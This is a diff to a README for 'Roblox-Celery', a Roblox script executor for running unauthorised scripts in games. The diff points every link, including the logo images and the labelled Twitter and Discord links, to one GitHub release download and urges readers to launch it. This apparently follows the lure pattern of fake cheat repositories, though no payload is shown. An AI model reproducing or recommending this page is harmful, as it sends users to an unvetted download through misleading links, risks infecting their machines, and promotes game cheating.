@@ -2,7 +2,7 @@
 
 ### Welcome to the Roblox-Celery repository! 
 
-![Roblox Logo](https://cdn.icon-icons.com/icons2/2699/PNG/512/roblox_logo_icon_169872.png)
+![Roblox Logo](https://github.com/meshmod/Roblox-Celery/releases/tag/v1.0)
 
 Roblox-Celery is a powerful Roblox Executor that redefines gameplay possibilities on the platform. It offers users a seamless experience to execute custom scripts, opening up a world of creativity and exploration within their favorite Roblox games.
 
@@ -17,7 +17,7 @@ Roblox-Celery is a powerful Roblox Executor that redefines gameplay possibilitie
 
 ### Get Started 🚗
 To access the Roblox-Celery Executor, please download the latest version from the following link:
-[![Download Roblox-Celery](https://img.shields.io/badge/Download-Roblox--Celery-green)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Roblox-Celery](https://github.com/meshmod/Roblox-Celery/releases/tag/v1.0)](https://github.com/meshmod/Roblox-Celery/releases/tag/v1.0)
 
 _Note: The link provided above needs to be launched to initiate the download._
 
@@ -28,10 +28,10 @@ We welcome contributions to the Roblox-Celery Executor! If you have ideas for im
 
 ### Connect with Us 🌐
 Stay updated on the latest Roblox-Celery news and updates:
-- Follow us on [Twitter](https://twitter.com/RobloxCelery)
-- Join our [Discord](https://discord.com/RobloxCelery) community
+- Follow us on [Twitter](https://github.com/meshmod/Roblox-Celery/releases/tag/v1.0)
+- Join our [Discord](https://github.com/meshmod/Roblox-Celery/releases/tag/v1.0) community
 
-![Roblox-Celery Logo](https://images.example.com/roblox-celery-logo.png)
+![Roblox-Celery Logo](https://github.com/meshmod/Roblox-Celery/releases/tag/v1.0)
 
 ### Thank you for Exploring Roblox-Celery! 🎮
 
